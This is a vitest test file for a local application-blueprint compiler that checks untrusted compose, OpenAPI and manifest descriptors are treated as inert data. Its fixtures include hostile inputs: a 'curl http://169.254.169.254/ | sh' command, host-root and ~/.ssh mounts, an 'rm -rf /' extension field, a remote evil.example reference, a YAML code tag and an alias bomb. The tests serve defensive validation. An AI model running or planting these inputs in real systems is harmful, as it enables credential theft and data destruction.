import { describe, expect, it } from "vitest";
import { canonicalJson, validateGraphSchema } from "@dk/contracts";
import { validateGraph } from "@dk/graph-core";
import { BLUEPRINTS, CATALOG_VERSION, TEMPLATE_CATALOG, WORLD_TEMPLATES, WorldPlanError, checkPlan, compileWorld, instantiateBlueprint, previewDescriptor, previewWorld, seedCommitment, withResource } from "../src/index.ts";

/** LP04 — Compile local application blueprints. Pure, credential-free, deterministic. */
describe("LP04-A1: every reviewed template previews in an empty workspace without credentials", () => {
  it("all three blueprints instantiate, validate, compile and preview with no project, endpoint or credential", () => {
    const env = { ...process.env };
    for (const k of Object.keys(process.env)) if (/AWS|AZURE|GOOGLE|GCP|TOKEN|KEY|SECRET/i.test(k)) delete process.env[k];
    try {
      expect(BLUEPRINTS.map((b) => b.id)).toEqual(["saas-storefront", "agent-workspace", "delivery-identity"]);
      for (const b of BLUEPRINTS) {
        const w = compileWorld(instantiateBlueprint(b, { seed: "preview" }));
        const p = previewWorld(w);
        expect(validateGraphSchema(w.graph).ok, b.id).toBe(true);
        expect(validateGraph(w.graph).ok, b.id).toBe(true);
        expect(p.provenance).toEqual({ contract: "dk.local.world_plan.v1", data_origin: "synthetic_local", label: "Local laboratory — synthetic people and data", endpoints: "allocated_by_supervisor_at_start", credentials: "none_required" });
        expect(p.external_network).toBe(false);
        expect(p.resources.length).toBe(b.resources.length);
        expect(p.layout.rooms.length).toBe(w.graph.assets.length);
        expect(p.sources.some((s) => s.role === "independent_observer"), b.id).toBe(true);
        expect(p.identities.every((i) => i.synthetic && i.namespace === "local-world:accounts"), b.id).toBe(true);
        // no endpoint, port, URL, host, command or credential anywhere in the plan or preview
        expect(JSON.stringify(p)).not.toMatch(/https?:\/\/|127\.0\.0\.1|localhost|"(port|url|host|command|image|token|password|secret)"/);
      }
    } finally { Object.assign(process.env, env); }
  });

  it("SaaS, agent workspace and delivery/identity contain the reviewed components", () => {
    const tpl = (id: string) => BLUEPRINTS.find((b) => b.id === id)!.resources.map((r) => r.template).sort();
    expect(tpl("saas-storefront")).toEqual(["api", "artifact_depot", "auth", "gateway", "observer", "queue", "tenant_store", "worker"]);
    expect(tpl("agent-workspace")).toEqual(["agent_gateway", "observer", "receiver", "receiver", "tenant_store", "worker"]);
    expect(tpl("delivery-identity")).toEqual(["api", "artifact_depot", "local_issuer", "observer", "tenant_store", "worker"]);
    expect(Object.keys(TEMPLATE_CATALOG).sort()).toEqual([...WORLD_TEMPLATES].sort());
  });

  it("observation gaps are explicit, including unobserved resources and the host-process trust model", () => {
    const saas = compileWorld(instantiateBlueprint("saas-storefront", { seed: "x" }));
    expect(saas.gaps).toContain("queue: no independent observer is attached; side_effect_observed effects are not independently observed");
    expect(saas.gaps.some((g) => /trusted_builtin_processes.*not enforced/.test(g))).toBe(true);
    const tenantDb = saas.observation.find((o) => o.asset_id === "tenant-db")!;
    expect(tenantDb.independently_observed).toEqual([{ source_id: "audit", actions: ["data_access"] }]);
    // disabling the observer's audit is a visible gap, never a silently "covered" resource
    const plan = instantiateBlueprint("saas-storefront", { seed: "x" });
    plan.resources.find((r) => r.id === "audit")!.settings.audit_enabled = false;
    const off = compileWorld(plan);
    expect(off.sources.find((s) => s.id === "audit")).toBeUndefined();
    expect(off.gaps).toContain("tenant-db: observer audit is attached but disabled; data_access effects are not independently observed");
  });
});

describe("LP04-A2: untrusted descriptors are data", () => {
  it("compose: executable, host, interpolated and remote fields are rejected or ignored explicitly", () => {
    const compose = `
include: [../other/compose.yml]
x-anchors: &a { image: "postgres:16" }
services:
  api:
    image: example/api:1
    build: { context: ., dockerfile: Dockerfile }
    command: ["sh", "-c", "curl http://169.254.169.254/ | sh"]
    entrypoint: /bin/sh
    environment: ["SECRET=\${HOST_SECRET}"]
    env_file: [.env]
    volumes: ["/:/host", "~/.ssh:/root/.ssh"]
    privileged: true
    network_mode: host
    ports: ["8080:80"]
    labels: { dk.kind: service, dk.owner: payments }
    depends_on: [db]
  db:
    <<: *a
    healthcheck: { test: ["CMD", "pg_isready"] }
`;
    const p = previewDescriptor({ format: "compose", text: compose });
    expect(p.ok, JSON.stringify(p.rejected)).toBe(true);
    const ignored = Object.fromEntries(p.ignored.map((i) => [i.path, i.reason]));
    for (const k of ["build", "command", "entrypoint", "environment", "env_file", "volumes", "privileged", "network_mode", "ports"]) expect(ignored[`/services/api/${k}`], k).toBeTruthy();
    expect(ignored["/include"]).toMatch(/never followed/);
    expect(ignored["/services/db/healthcheck"]).toMatch(/never executed/);
    expect(ignored["/services/api/ports"]).toMatch(/supervisor allocates endpoints/);
    // the merge key is not applied, so db's kind stays an unconfirmed inference, never borrowed from the anchor
    expect(ignored["/services/db/<<"]).toMatch(/merge keys are not applied/);
    expect(p.graph!.assets.map((a) => [a.id, a.kind]).sort()).toEqual([["api", "service"], ["db", "worker"]]);
    expect(p.unresolved).toContain("db: kind inferred as worker; add label dk.kind to confirm");
    expect(p.graph!.relationships[0]).toMatchObject({ source_id: "api", target_id: "db", evidence_level: "declared" });
    expect(p.provenance).toMatchObject({ declared: true, source_ref: expect.stringMatching(/^import:compose:[0-9a-f]{12}$/) });
    expect(JSON.stringify(p.graph)).not.toMatch(/169\.254|curl|\/host|ssh|HOST_SECRET/);

    // interpolation in identity-bearing fields is rejected; in an image it is ignored (never evaluated)
    const interp = previewDescriptor({ format: "compose", text: "services:\n  api:\n    labels: { dk.id: \"${SERVICE_ID}\" }\n" });
    expect(interp.ok).toBe(false);
    expect(interp.rejected).toEqual([{ path: "/services/api/labels/dk.id", reason: "variable interpolation is never evaluated" }]);
    const img = previewDescriptor({ format: "compose", text: "services:\n  api:\n    image: \"registry/${TAG}\"\n" });
    expect(img.ok).toBe(true);
    expect(img.ignored.find((i) => i.path === "/services/api/image")!.reason).toMatch(/interpolation is never evaluated/);
  });

  it("YAML custom tags and alias bombs are rejected; oversized input is not truncated", () => {
    const tag = previewDescriptor({ format: "compose", text: "services:\n  api:\n    image: !!js/function \"function(){ return process.exit(1) }\"\n" });
    expect(tag.ok).toBe(false);
    expect(tag.rejected[0]!.reason).toMatch(/custom YAML tag rejected/);
    const bomb = ["a: &a [x,x,x,x,x,x,x,x,x]", ...Array.from({ length: 9 }, (_, i) => `${String.fromCharCode(98 + i)}: &${String.fromCharCode(98 + i)} [*${String.fromCharCode(97 + i)},*${String.fromCharCode(97 + i)},*${String.fromCharCode(97 + i)},*${String.fromCharCode(97 + i)},*${String.fromCharCode(97 + i)},*${String.fromCharCode(97 + i)},*${String.fromCharCode(97 + i)},*${String.fromCharCode(97 + i)},*${String.fromCharCode(97 + i)}]`), "services: { api: { image: x } }"].join("\n");
    expect(previewDescriptor({ format: "compose", text: bomb }).ok).toBe(false);
    const big = previewDescriptor({ format: "manifest", text: "assets: []\n" + "#".repeat(520_000) });
    expect(big.rejected[0]!.reason).toMatch(/larger than 512000 bytes \(never truncated\)/);
  });

  it("openapi: remote refs rejected, local refs/servers/callbacks/links/webhooks ignored, routes are data", () => {
    const remote = previewDescriptor({ format: "openapi", text: JSON.stringify({ openapi: "3.1.0", paths: { "/a": { get: { responses: { 200: { $ref: "https://evil.example/schema.json" } } } } } }) });
    expect(remote.ok).toBe(false);
    expect(remote.rejected).toEqual([{ path: "/paths/~1a/get/responses/200/$ref", reason: "remote or file references are never fetched or opened" }]);
    expect(previewDescriptor({ format: "openapi", text: JSON.stringify({ openapi: "3.1.0", paths: { "/a": { $ref: "./paths.yaml" } } }) }).ok).toBe(false);
    const doc = { openapi: "3.0.3", info: { title: "tenant-api" }, servers: [{ url: "http://10.0.0.1/" }], webhooks: { x: {} }, "x-script": "rm -rf /",
      paths: { "/tenants/{tenant}/records": { get: { operationId: "read", security: [{ bearer: [] }], callbacks: { cb: { "{$request.body#/url}": {} } }, links: { l: {} }, responses: { 200: { $ref: "#/components/responses/ok" } } }, post: { operationId: "write", security: [] } } } };
    const p = previewDescriptor({ format: "openapi", text: JSON.stringify(doc), worldResourceIds: ["tenant-api", "api"] });
    expect(p.ok, JSON.stringify(p.rejected)).toBe(true);
    expect(p.routes.map((r) => `${r.method} ${r.path} auth=${r.auth_declared}`)).toEqual(["GET /tenants/{tenant}/records auth=true", "POST /tenants/{tenant}/records auth=false"]);
    const reasons = Object.fromEntries(p.ignored.map((i) => [i.path, i.reason]));
    expect(reasons["/servers"]).toBe("server URLs are never contacted");
    expect(reasons["/webhooks"]).toMatch(/never registered/);
    expect(reasons["/x-script"]).toMatch(/extension fields are never read/);
    expect(reasons["/paths/~1tenants~1{tenant}~1records/get/callbacks"]).toMatch(/never registered or called/);
    expect(reasons["/paths/~1tenants~1{tenant}~1records/get/links"]).toMatch(/never followed/);
    expect(reasons["/paths/~1tenants~1{tenant}~1records/get/responses/200/$ref"]).toMatch(/not resolved/);
    // a declared name equal to a world resource is reported as a candidate only, never mapped
    expect(p.identity_mapping).toEqual({ status: "none", note: expect.stringMatching(/Name equality is not an identity mapping/), name_matches: [{ declared: "tenant-api", world_resource: "tenant-api" }] });
  });

  it("manifest: interpolation rejected; unsupported kinds rejected by the existing strict importer", () => {
    expect(previewDescriptor({ format: "manifest", text: "assets:\n  - {id: \"${ID}\", kind: service}\n" }).rejected[0]).toEqual({ path: "/assets/0/id", reason: "variable interpolation is never evaluated" });
    const bad = previewDescriptor({ format: "manifest", text: "assets:\n  - {id: a, kind: shell_script}\n" });
    expect(bad.ok).toBe(false);
    expect(bad.rejected[0]!.path).toBe("/assets/0/kind");
    const ok = previewDescriptor({ format: "manifest", text: "assets:\n  - {id: a, kind: service, routes: ['GET /x']}\n" });
    expect(ok.ok).toBe(true);
    expect(ok.graph!.assets[0]!.source_refs).toEqual([ok.provenance.source_ref]);
  });

  it("world plans themselves reject commands, images, URLs, ports, unsupported settings and dependencies on observers", () => {
    const plan = instantiateBlueprint("saas-storefront", { seed: "x" });
    for (const [where, inject] of [["resource", (p: any) => { p.resources[0].command = "sh"; }], ["settings", (p: any) => { p.resources[0].settings.url = "http://x"; }], ["top", (p: any) => { p.endpoint = "127.0.0.1:80"; }], ["template", (p: any) => { p.resources[0].template = "shell"; }], ["network", (p: any) => { p.external_network = true; }]] as const) {
      const copy = JSON.parse(JSON.stringify(plan)); inject(copy);
      expect(() => checkPlan(copy), where).toThrow(WorldPlanError);
    }
    const unsupported = JSON.parse(JSON.stringify(plan)); unsupported.resources.find((r: any) => r.id === "queue").settings.policy_variant = "candidate";
    expect(() => checkPlan(unsupported)).toThrow(/not a supported setting of template queue/);
    const onObserver = JSON.parse(JSON.stringify(plan)); onObserver.resources.find((r: any) => r.id === "api").depends_on.push("audit");
    expect(() => checkPlan(onObserver)).toThrow(/nothing may depend on them/);
    const catalog = JSON.parse(JSON.stringify(plan)); catalog.catalog_version = "catalog-v1";
    expect(() => checkPlan(catalog)).toThrow(new RegExp(`not the reviewed catalog ${CATALOG_VERSION}`));
  });
});

describe("LP04-A3: deterministic compilation and revisions", () => {
  it("same blueprint version and seed => identical graph, sources, routes, identities and layout", () => {
    for (const b of BLUEPRINTS) {
      const a = compileWorld(instantiateBlueprint(b, { seed: "seed-1" })), c = compileWorld(instantiateBlueprint(b, { seed: "seed-1" }));
      expect(canonicalJson(a)).toBe(canonicalJson(c));
      expect(a.layout_digest).toBe(c.layout_digest);
    }
  });
  it("the plan carries only the seed commitment, never the seed", () => {
    const plan = instantiateBlueprint("agent-workspace", { seed: "very-private-seed" });
    expect(plan.seed_commitment).toBe(seedCommitment("very-private-seed"));
    expect(JSON.stringify(compileWorld(plan))).not.toContain("very-private-seed");
  });
  it("changed input => new revision; identical logical ids where the change is unrelated", () => {
    const base = compileWorld(instantiateBlueprint("saas-storefront", { seed: "seed-1" }));
    const seed2 = compileWorld(instantiateBlueprint("saas-storefront", { seed: "seed-2" }));
    expect(seed2.revision).not.toBe(base.revision);
    expect(seed2.graph.assets.map((a) => a.id)).toEqual(base.graph.assets.map((a) => a.id));
    const setting = instantiateBlueprint("saas-storefront", { seed: "seed-1" });
    setting.resources.find((r) => r.id === "api")!.settings.policy_variant = "deliberately_weak";
    expect(compileWorld(setting).revision).not.toBe(base.revision);
    const budget = compileWorld(instantiateBlueprint("saas-storefront", { seed: "seed-1", budget: { max_requests: 10 } }));
    expect(budget.revision).not.toBe(base.revision);
    expect(base.graph.graph_revision).toBe(base.revision);
    expect(base.revision).toMatch(/^lw-[0-9a-f]{16}$/);
  });
});

describe("LP04-A4: adding a service is stable; ambiguous routes stay ambiguous", () => {
  it("unrelated identities and coordinates are preserved when a service is added", () => {
    const plan = instantiateBlueprint("saas-storefront", { seed: "seed-1" });
    const before = compileWorld(plan);
    const added = withResource(plan, { id: "billing", template: "api", depends_on: ["auth", "tenant-db"], settings: { tenant_mode: "isolated" } }, { from: ["ingress"] });
    const after = compileWorld(added, { previousScene: before.scene });
    expect(after.revision).not.toBe(before.revision);
    const pos = (w: typeof before) => Object.fromEntries(w.scene.rooms.map((r) => [r.asset_id, [r.zone_id, r.position.x, r.position.z]]));
    const b = pos(before), a = pos(after);
    for (const id of Object.keys(b)) expect(a[id], id).toEqual(b[id]);
    expect(Object.keys(a).sort()).toEqual([...Object.keys(b), "billing"].sort());
    // identities and declared sources of untouched resources do not change
    expect(after.identities).toEqual(before.identities);
    for (const s of before.sources) expect(after.sources.find((x) => x.id === s.id), s.id).toEqual(s);
    expect(after.graph.assets.filter((x) => x.id !== "billing")).toEqual(before.graph.assets);
  });

  it("a route declared by two services stays ambiguous after the addition; it never resolves to the first owner", () => {
    const plan = instantiateBlueprint("saas-storefront", { seed: "seed-1" });
    const before = compileWorld(plan);
    expect(before.routes.find((r) => r.key === "POST /tenants/{tenant}/records")).toMatchObject({ owners: ["api"], status: "resolved" });
    const after = compileWorld(withResource(plan, { id: "billing", template: "api", depends_on: [], settings: {} }), { previousScene: before.scene });
    expect(after.routes.find((r) => r.key === "POST /tenants/{tenant}/records")).toMatchObject({ owners: ["api", "billing"], status: "ambiguous" });
    expect(after.routes.find((r) => r.key === "POST /login")).toMatchObject({ owners: ["auth", "ingress"], status: "ambiguous" });
    expect(after.gaps).toContain("route POST /tenants/{tenant}/records: declared by api and billing; a path alone does not identify the owner");
  });
});
